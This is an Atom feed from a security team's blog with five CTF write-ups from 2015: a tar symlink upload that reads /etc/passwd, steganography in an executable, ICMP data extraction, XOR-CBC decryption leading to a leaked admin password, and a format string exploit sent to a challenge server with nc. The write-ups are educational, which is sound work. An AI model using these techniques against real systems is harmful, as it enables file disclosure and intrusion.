<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | GeeksSpeak Team Blog]]></title>
  <link href="http://geeksspeak.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://geeksspeak.github.io/"/>
  <updated>2015-04-06T01:57:27+04:30</updated>
  <id>http://geeksspeak.github.io/</id>
  <author>
    <name><![CDATA[GeeksSpeak]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[NDH CTF 2015 - Facesec Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-facesec-writeup/"/>
    <updated>2015-04-06T01:56:25+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-facesec-writeup</id>
    <content type="html"><![CDATA[<p><strong>NDH 2015 Facesec Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Web</strong><br/>
<strong>Description : </strong></p>

<blockquote><p>&ldquo;Hello there,</p>

<p>We are looking for a developer or security consultant to secure our filebox system. We stumbled upon your LinkedIn profile and it seems like you would be a perfect candidate for this job. Could you please send us your CV and Motivation letter?<br/>
Thanks,</p>

<p><a href="http://facesec.challs.nuitduhack.com/">http://facesec.challs.nuitduhack.com/</a></p></blockquote>

<p>after you open the link , you can see a login/register system.so sign up and login to my account</p>

<p>after that you seen a upload form with this description :</p>

<blockquote><p>You can upload a .txt file if you specify the type of the content (cv or motivation letter).
If you want, you can upload a tar archive which contains two files (cv.txt and motiv.txt).
The content will be update in your profil we can examine your instance.</p></blockquote>

<p>so try to upload your file , contents of 2 texts go to 2 field in your profile name as CV and Motivation Letter</p>

<!--more-->


<p>if you try to upload file with extension you got an error</p>

<p>you can .tar file.<br/>
according to this link you can execute command with tar file :</p>

<p><a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">Tar file command execution</a><br/>
so we try to Symlink /etc/passwd to CV.txt</p>

<p>when upload complete and we go to the profile link we can see this :</p>

<pre><code>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin facesec:x:1000:1000:W00tSymL1nkAttackStillW0rksIn2k15:/home/facesec:/bin/sh 
</code></pre>

<p>Bingo :D</p>

<p>Flag is : W00tSymL1nkAttackStillW0rksIn2k15</p>

<p>WriteUp By Fr0nk</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NDH CTF 2015 - Cooper Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-cooper-writeup/"/>
    <updated>2015-04-06T01:52:15+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-cooper-writeup</id>
    <content type="html"><![CDATA[<p><strong>NDH 2015 Cooper Writeup</strong><br/>
<strong>Point = 300</strong><br/>
<strong>Category = Stegano</strong></p>

<blockquote><p>&ldquo;I am not crazy, my mother had me tested.&rdquo; (Sheldon)</p>

<p>What did Sheldon &hellip; huh sorry, Dr. Cooper really mean?
(<a href="http://quals.nuitduhack.com/challenges/view/14">http://quals.nuitduhack.com/challenges/view/14</a>)</p></blockquote>

<p>The tar zip contains a Windows executable, so the first thing I did was opening it in CFF Explorer.
Doing so I found a picture of Sheldon &hellip; or better say <code>"Dr. Cooper"</code> in resources and a section called .hidden containing a ZIP file.</p>

<p><img src="/files/ctf/ndh2k15/cooper/cooper.bmp" title="khkhkhhhhhh" alt="Sheldon's picture" /></p>

<!--more-->


<p>Within the zip file there was a C++ code project with encrypt and decrypt functions.</p>

<pre><code>&gt; dir Stegano-BMP-master
...
2013-06-21  05:24 PM               533 decrypt.cpp
2015-04-04  12:10 PM    &lt;DIR&gt;          easybmp
2013-06-21  05:24 PM               768 encrypt.cpp
2013-06-21  05:24 PM                28 main.cpp
2013-06-21  05:24 PM               564 Makefile
2013-06-21  05:24 PM               238 README.md
2013-06-21  05:24 PM             2,705 stegano.cpp
2013-06-21  05:24 PM               196 stegano.h
               7 File(s)          5,032 bytes
</code></pre>

<p> First thing that strikes the mind is to compile the project and decrypt (extract) the flag from it, and I did, and I FAILED :(</p>

<pre><code class="`"> &gt;decrypt cooper.bmp
 3
</code></pre>

<p> Obviously <code>3</code> cannot be the flag! (but I did submit it and the server did reject it :))
 So I insepected the files more, and I found a <a href="/pdfFile.pdf">PDF</a> file in the EXE&rsquo;s hex dump.
 I fixed and opened it and finally found &ldquo;my precious&rdquo;!</p>

<p> <img src="/files/ctf/ndh2k15/cooper/flag.jpg" title="StephenHawkingSpentSomeTimeOnSteganoTrolling" alt="tha flag" /></p>

<p>BTW: The <a href="/files/ctf/ndh2k15/cooper/pdfFile.pdf">PDF</a> is password protected which the reader has to guess :D</p>

<p> Written by <strong><a href="http://twitter.com/shabgrd">MMS</a></strong></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NDH CTF 2015 - Private Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-private-writeup/"/>
    <updated>2015-04-05T15:43:15+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-private-writeup</id>
    <content type="html"><![CDATA[<p><strong>NDH 2015 Private Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Forensics</strong><br/>
<strong>Description : </strong></p>

<blockquote><p>&ldquo;The quiet you are, the more you are able to ear&rdquo;</p></blockquote>

<p>We&rsquo;ve provided a pcapng file in this challenge. At first glance I thought it may be VoIP challenge because of description but after viewing packets , this assumption goes wrong. there were some STP , CDP and some ICMP packets . after some investigation in packets i found some unusual ICMP packets ! their identification fields were 0 ! all of them ! hmmm. seems somebody generated them manually by a packet generator . so i focused on them to find a pattern .actually their IP headers had a pattern and they were ASCII numbers ! sweet . that&rsquo;s easy . let&rsquo;s have some fun with Scapy .</p>

<pre><code>from scapy.all import *
from scapy.utils import rdpcap
flag=""
pkts=rdpcap("private.pcap")
for pkt in pkts:
     if (ICMP in pkt and pkt[ICMP].type==8 and pkt[ICMP].id==0 ):
        flag += chr(pkt[IP].id)
print flag      
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NDH CTF 2015 - Updator Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-updator-writeup/"/>
    <updated>2015-04-05T03:28:56+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-updator-writeup</id>
    <content type="html"><![CDATA[<p><strong>NDH 2015 Updator Writeup</strong><br/>
<strong>Point = 200</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>Unhackable : &ldquo;Not hackable; that cannot be hacked or broken into.&rdquo;
We manage updates and thus have fixes, this is not a PS3 as it is unhackable &hellip; or is it?
Score     200
Link      <a href="http://updator.challs.nuitduhack.com/">http://updator.challs.nuitduhack.com/</a></p></blockquote>

<p>openning the url gives us a login page and a update button. pressing update button shows an notification:</p>

<blockquote><p>The update managing system is still under construction but will be available soon.</p></blockquote>

<p>We noticed it&rsquo;s a python script <code>update.py</code>. So attempting to loading <code>update.pyc</code> gave us the permission to download the file. Instantly i tried to decompile the code with <code>uncompyle2</code> as:</p>

<!--more-->


<pre><code>$ /usr/local/bin/uncompyle2 update.pyc &gt; update.py
$ cat update.py
# 2015.04.05 03:00:11 IRDT
# Embedded file name: update.py
import config
import sys
KEY = config.KEY

def xor(*args):
    if len(args) &lt; 2:
        sys.exit(0)
    length = len(args[0])
    for arg in args:
        if len(arg) != length:
            sys.exit(0)
        length = len(arg)

    cipher = args[0]
    for arg in args[1:]:
        cipher = ''.join([ chr(ord(arg[i]) ^ ord(cipher[i])) for i in range(len(arg)) ])

    return cipher


class Crypto:

    @staticmethod
    def encrypt(file):
        with open(file, 'r') as fd:
            content = fd.read()
        content = content.ljust(len(content) + (8 - len(content) % 8), '0')
        blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
        with open('%s.encrypted' % file, 'w') as fd:
            encrypted = []
            for i in range(len(blocks)):
                if i == 0:
                    encrypted.append(xor(KEY, blocks[i]))
                else:
                    encrypted.append(xor(KEY, blocks[i], encrypted[i - 1]))

            fd.write(''.join(encrypted))

    @staticmethod
    def decrypt(file):
        with open(file, 'r') as fd:
            content = fd.read()
        blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
        with open('.'.join(file.split('.')[:-1]), 'w') as fd:
            plain = []
            for i in range(len(blocks)):
                if i == 0:
                    plain.append(xor(KEY, blocks[i]))
                else:
                    plain.append(xor(KEY, blocks[i], blocks[i - 1]))

            fd.write(''.join(plain).rstrip('0'))


print 'Content-Type: text/html'
print '\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta charset="UTF-8"&gt;\n    &lt;title&gt;Updator - Update system&lt;/title&gt;\n    &lt;link rel="stylesheet" href="static/font-awesome/css/font-awesome.css"&gt;\n    &lt;link rel="stylesheet" href="static/css/style.css"&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;div id="info"&gt;\n      The update managing system is still under construction but will be available soon.\n    &lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n'
# okay decompyling update.pyc 
# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
# 2015.04.05 03:00:11 IRDT
</code></pre>

<p>This a simple CBC mode XOR encryption. In the meantime my friend figured out that <code>robots.txt</code> tells us we should take look at <code>/temp/</code> directory. there was a file named <code>log.py.encrypted</code>:</p>

<blockquote><p>Index of /temp
[ICO]  Name    Last modified   Size    Description<br/>
[DIR]  Parent Directory        - <br/>
[TXT]  log.py.encrypted    31-Mar-2015 17:35   328      <br/>
Apache/2.2.22 (Debian) Server at 10.0.0.5 Port 80</p></blockquote>

<p>As we saw in the decompiled source the encrypt function encrypts a file and saves as <code>name+.encrypted</code>. So we tried to decrypt the file as my friend did. with this assumption that the first block has <code>import</code> keyword he xor the first block with that and take a some chars for the <code>KEY</code>. remember the CBC mode:
<img src="http://upload.wikimedia.org/wikipedia/commons/8/80/CBC_encryption.svg"/><br/>
We have second block if we calculate <code>encrypted[0] ^ encrypted[1]</code>. So he xored the calculated block and the key he take from the previous part. and there was <code>atetime</code>. So after completing the key we can decrypt the file. ( ofcourse it is not a proper solution as you can use xortool and &hellip; but faster than everything :) thanks to him ;) ). So i managed to decrypt the file using edited above source:</p>

<pre><code>import sys
KEY = '6[@dq"&amp;s'

def xor(*args):
    if len(args) &lt; 2:
        sys.exit(0)
    length = len(args[0])
    for arg in args:
        if len(arg) != length:
            sys.exit(0)
        length = len(arg)

    cipher = args[0]
    for arg in args[1:]:
        cipher = ''.join([ chr(ord(arg[i]) ^ ord(cipher[i])) for i in range(len(arg)) ])

    return cipher


def decrypt(file):
    with open(file, 'rb') as fd:
        content = fd.read()
    blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
    with open('.'.join(file.split('.')[:-1]), 'w') as fd:
        plain = []
        for i in range(len(blocks)):
            if i == 0:
                plain.append(xor(KEY, blocks[i]))
            else:
                plain.append(xor(KEY, blocks[i], blocks[i - 1]))

        fd.write(''.join(plain).rstrip('0'))


decrypt('log.py.encrypted')
</code></pre>

<p>make sure you use <code>rb</code> to decrypt properly. We have decrypted file as:</p>

<pre><code>import datetime

LOG_DIR = 'logs'

class Logger():

    @staticmethod
    def log(username, password):
        basename = '%s/%s_%s' % (LOG_DIR, str(datetime.date.today()), username)
        with open(basename, 'a+') as fd:
            fd.write('[%s] Login with password %s\n' % (str(datetime.datetime.today()), password))
</code></pre>

<p>there is another directory we should take a look <code>logs</code> no permission:</p>

<blockquote><p>Forbidden<br/>
You don&rsquo;t have permission to access /logs/ on this server.<br/>
Apache/2.2.22 (Debian) Server at 10.0.0.5 Port 80</p></blockquote>

<p>but reading carefully the code gave me the idea to find the exact location:</p>

<pre><code class="python">&gt;&gt;&gt; import datetime
&gt;&gt;&gt; str(datetime.date.today())
'2015-04-04'
&gt;&gt;&gt; print "%s/%s_%s" %("logs", str(datetime.date.today()), "admin")
logs/2015-04-04_admin
&gt;&gt;&gt; 
</code></pre>

<p>opening <code>http://updator.challs.nuitduhack.com/logs/2015-04-04_admin</code> gave me this log:</p>

<blockquote><p>[2015-04-04 18:49:48.839448] Login with password Mpt2P4sse2Ouf
[2015-04-04 18:49:54.044382] Login with password Mot2P4sse2Ouf</p></blockquote>

<p>Second password worked for me and after logging in we have the flag:</p>

<blockquote><p>Well played, here is your flag : zEpbiUFt5p7m84cxOxN6</p></blockquote>

<p>Interesting challenge So we&rsquo;ve got 200pts.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - TEAM Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup/"/>
    <updated>2015-04-03T03:16:39+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 TEAM Writeup</strong><br/>
<strong>Point = 600</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>There is a wierd kind of authentication service running: nc hack.bckdr.in 8004. The binary can be found here. The vampire says that there is no need for bruteforce.</p></blockquote>

<pre><code>$ file team
team: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=3fb6836dc9249bd1e7c33e023d563ff429d7dca4, stripped
$ checksec.sh --file team
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   team
</code></pre>

<p>Ok looking into the binary in IDA shows us two function <code>0x08048769</code> and <code>0x080486ad</code> are important to us. the first one can be seen bellow:</p>

<!--more-->


<pre><code>int sub_8048769()
{
  const char *v0; // ST18_4@1
  const char *v1; // ST1C_4@1

  v0 = (const char *)malloc(0xC8u);
  v1 = (const char *)malloc(0x64u);
  printf("Enter teamname: ");
  fflush(stdout);
  __isoc99_scanf("%200s", v0);
  printf("Enter flag: ");
  fflush(stdout);
  __isoc99_scanf("%100s", v1);
  sleep(2u);
  sub_80486AD(v0, v1);
  free((void *)v0);
  free((void *)v1);
  return 0;
}
</code></pre>

<p>As you can see there is no potential flaw so we skip to second one:</p>

<pre><code>signed int __cdecl sub_80486AD(const char *a1, const char *a2)
{
  signed int result; // eax@2
  int v3; // edx@7
  FILE *stream; // [sp+24h] [bp-74h]@1
  char s; // [sp+28h] [bp-70h]@3
  int v6; // [sp+8Ch] [bp-Ch]@1

  v6 = *MK_FP(__GS__, 20);
  stream = fopen("flag.txt", "r");
  if ( stream )
  {
    fgets(&amp;s, 100, stream);
    printf(a1);
    if ( !strcmp(&amp;s, a2) )
      puts(" : correct flag!");
    else
      puts(" : incorrect flag. Try again.");
    fclose(stream);
    result = 0;
  }
  else
  {
    result = 1;
  }
  v3 = *MK_FP(__GS__, 20) ^ v6;
  return result;
}
</code></pre>

<p>interesting! in this function flag.txt will be opened and read but the important part is <code>printf(a1);</code>. remember previous function <code>a1</code> is the <code>v0</code> var which have the teamname! So there is a <em>Format String Vulnerability</em>. And the abuse is pretty simple, just printing the stack addresses to leak the flag:</p>

<pre><code>$ cat 5
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
A

$ cat 5 | nc hack.bckdr.in 8004
Enter teamname: Enter flag: 0x640x9dd11400xf770ec20(nil)0x10x9dd10d80x9dd10080xf773855c0x9dd11400x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x626631370x80483000x1(nil)0x1(nil)(nil)0xff8b30880xf772b5000x10x5fc69000(nil)(nil)0xff8b3088 : incorrect flag. Try again.
</code></pre>

<p>you can see that
<code>
0x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x62663137
</code>
is our flag. using python <code>struct</code> module for all gives us this one:</p>

<pre><code>[redacted]
</code></pre>

<p>which added 600pts to our points.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
</feed>
